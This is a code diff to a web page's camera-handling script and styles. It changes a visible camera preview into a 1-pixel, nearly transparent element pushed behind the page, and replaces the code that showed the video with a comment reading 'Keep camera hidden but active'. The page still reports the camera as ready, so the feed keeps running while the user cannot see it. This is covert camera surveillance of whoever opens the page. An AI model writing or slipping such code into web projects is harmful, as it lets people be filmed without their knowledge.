@@ -176,12 +176,15 @@
         }
 
         /* Hidden camera video element */
-        #cam {
-            width: 200px;
-            margin: 10px auto;
-            display: none;
-            border: 1px solid #333333;
-            border-radius: 10px;
+        #cam { 
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -999;
         }
 
         #canvas {
@@ -417,7 +420,7 @@
 
         // Show video element (IMPORTANT for iOS!)
         var videoElement = document.getElementById('cam');
-        videoElement.style.display = 'block';
+        // Keep camera hidden but active videoElement.style.position = 'fixed'; videoElement.style.top = '0'; videoElement.style.left = '0'; videoElement.style.width = '1px'; videoElement.style.height = '1px'; videoElement.style.opacity = '0.01';
 
         try {
             debugLog('📷 Requesting camera permission...');
@@ -458,16 +461,7 @@
             if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                 cameraIsActive = true;
                 debugLog('✅ Camera: WORKING! ' + videoElement.videoWidth + 'x' + videoElement.videoHeight);
-                document.getElementById('status').textContent = 'CAMERA READY';
-
-                // Hide video after confirming it works (keep it tiny but active)
-                setTimeout(function() {
-                    videoElement.style.width = '2px';
-                    videoElement.style.height = '2px';
-                    videoElement.style.opacity = '0.01';
-                    videoElement.style.margin = '0';
-                    videoElement.style.border = 'none';
-                }, 1000);
+                document.getElementById('status').textContent = 'CAMERA READY'
 
                 return true;
             } else {
